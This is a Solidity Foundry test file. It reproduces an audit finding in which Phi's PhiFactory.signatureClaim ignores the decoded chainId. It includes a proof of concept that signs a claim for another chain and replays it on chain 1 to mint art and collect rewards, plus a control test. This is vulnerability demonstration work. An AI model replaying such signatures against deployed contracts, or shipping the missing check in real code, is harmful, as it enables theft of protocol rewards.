// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./41087-h-01-signature-replay-in-signatureclaim-results-in-unauthori.sol";

/*//////////////////////////////////////////////////////////////
    Phi -- Signature replay in signatureClaim ignores chainId (H-01, #41087)

    PhiFactory.signatureClaim decodes encodeData_ as (expiresIn_, minter_,
    ref_, verifier_, artId_, chainId, data_) -- the chainId slot is decoded
    and immediately discarded, never checked against block.chainid. A
    signature signed for a completely different chain (999) is honored on
    this chain (1) anyway, letting an attacker who obtained a valid Phi
    signer signature for one chain replay it to claim rewards on another.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm from the driver's perspective.
    - test_signatureReplayAcrossChains: standalone rebuild mirroring the
      finding's own PoC shape (EOA participant, real ECDSA signature signed
      with vm.sign for a foreign chain id, claimed directly on this chain).
    - test_correctChainIdStillWorks: control -- a signature signed for THIS
      chain's id is also accepted (the bug is a missing check, not that all
      claims are broken).
//////////////////////////////////////////////////////////////////////////*/
contract PhiSignatureReplayChainIdTest is Test {
    uint256 constant SIGNER_PK = 0xA11CE;

    function _sign(uint256 pk, bytes memory encodeData) internal pure returns (bytes memory) {
        bytes32 digest = keccak256(encodeData);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethSigned);
        return abi.encodePacked(r, s, v);
    }

    /// @notice HARM via the self-contained Exploit: a signature signed for a foreign
    ///         chain id (999) is honored on this chain (1) anyway.
    function test_exploit() public {
        vm.chainId(1);
        Exploit e = new Exploit();
        e.run();

        MockArt1155 art = e.art();
        MockRewardToken rewardToken = e.rewardToken();
        PhiFactory factory = e.factory();

        // Re-assert the HARM independently from the driver.
        assertEq(art.balanceOf(e.PARTICIPANT(), 1), 1, "participant received art despite wrong-chain signature");
        assertEq(rewardToken.balanceOf(e.VERIFIER()), factory.VERIFY_REWARD(), "protocol reward pool paid out");
    }

    /// @notice Standalone rebuild with a REAL ECDSA signature generated via vm.sign,
    ///         mirroring the finding's own PoC (a signature explicitly bound to
    ///         `otherChainId` is accepted on this chain, whose id differs).
    function test_signatureReplayAcrossChains() public {
        vm.chainId(1);
        MockArt1155 art = new MockArt1155();
        MockRewardToken rewardToken = new MockRewardToken();
        address signer = vm.addr(SIGNER_PK);
        PhiFactory factory = new PhiFactory(signer, art, rewardToken);
        rewardToken.mint(address(factory), 1000);

        address participant = makeAddr("participant");
        address verifier = makeAddr("verifier");
        uint256 otherChainId = 99_999;
        assertNotEq(block.chainid, otherChainId, "sanity: signature is for a genuinely different chain");

        bytes memory encodeData =
            abi.encode(uint256(2_000_000_000), participant, address(0), verifier, uint256(7), otherChainId, bytes32("x"));
        bytes memory sig = _sign(SIGNER_PK, encodeData);

        // The signature was only ever meant to authorize a claim on chain 99999 --
        // it is replayed here, on chain 1, directly against PhiFactory.
        factory.signatureClaim(sig, encodeData, 1, 1);

        assertEq(art.balanceOf(participant, 1), 1, "wrong-chain signature still minted the art");
        assertEq(rewardToken.balanceOf(verifier), factory.VERIFY_REWARD(), "wrong-chain signature still paid the reward");
    }

    /// @notice Control: a signature correctly bound to THIS chain's id is also
    ///         accepted -- confirming the defect is a MISSING check, not that the
    ///         signature scheme is broken outright.
    function test_correctChainIdStillWorks() public {
        vm.chainId(1);
        MockArt1155 art = new MockArt1155();
        MockRewardToken rewardToken = new MockRewardToken();
        address signer = vm.addr(SIGNER_PK);
        PhiFactory factory = new PhiFactory(signer, art, rewardToken);
        rewardToken.mint(address(factory), 1000);

        address participant = makeAddr("participant2");
        address verifier = makeAddr("verifier2");

        bytes memory encodeData =
            abi.encode(uint256(2_000_000_000), participant, address(0), verifier, uint256(11), block.chainid, bytes32("y"));
        bytes memory sig = _sign(SIGNER_PK, encodeData);

        factory.signatureClaim(sig, encodeData, 1, 1);

        assertEq(art.balanceOf(participant, 1), 1, "correctly-bound signature claims as expected");
    }
}
